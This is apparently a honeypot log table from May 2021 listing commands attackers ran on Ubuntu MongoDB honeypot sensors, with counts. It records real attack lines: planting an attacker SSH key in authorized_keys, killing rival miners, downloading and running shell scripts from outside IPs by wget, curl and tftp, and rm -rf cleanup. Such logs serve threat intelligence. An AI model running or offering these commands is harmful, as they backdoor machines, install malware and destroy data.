Date        Sensor                                                            Pre-Disconnect-Command                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   Count
----------  ----------------------------------------------------------------  -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------  -------
2021-05-06  ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02  cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~      125
2021-05-06  ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02  cat /etc/issue                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              16
2021-05-06  ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02  uname -a                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    11
2021-05-03  ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-01  cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~      102
2021-05-03  ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-01  cat /etc/issue                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              16
2021-05-03  ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-01  pkill kitten; pkill YDEdr; pkill ip; pkill xmrig; pkill cnrig; pkill kswapd0; pkill x86_64; pkill x86; cd /tmp; rm -rf config.json; rm -rf kitten; wget http://88.218.17.142/boom.sh; curl -O http://88.218.17.142/boom.sh; busybox wget http://88.218.17.142/boom.sh; chmod 777 *; sh boom.sh; cat /etc/issue;                                                                                                                                                                                             13
2021-05-05  ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-03  echo -e "\x6F\x6B"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        1570
2021-05-05  ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-03  cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~       66
2021-05-05  ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-03  cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://2.57.122.149/z.sh; curl -O http://2.57.122.149/z.sh; chmod 777 z.sh; sh z.sh; tftp 2.57.122.149 -c get tz.sh; chmod 777 tz.sh; sh tz.sh; tftp -r tz2.sh -g 2.57.122.149; chmod 777 tz2.sh; sh tz2.sh; ftpget -v -u anonymous -p anonymous -P 21 2.57.122.149 z1.sh z1.sh; sh z1.sh; rm -rf z.sh tz.sh tz2.sh z1.sh; rm -rf *                                                                                                             11
2021-05-04  ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-01  echo -e "\x6F\x6B"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        1368
2021-05-04  ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-01  cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~       86
2021-05-04  ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-01  cat /etc/issue                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              16
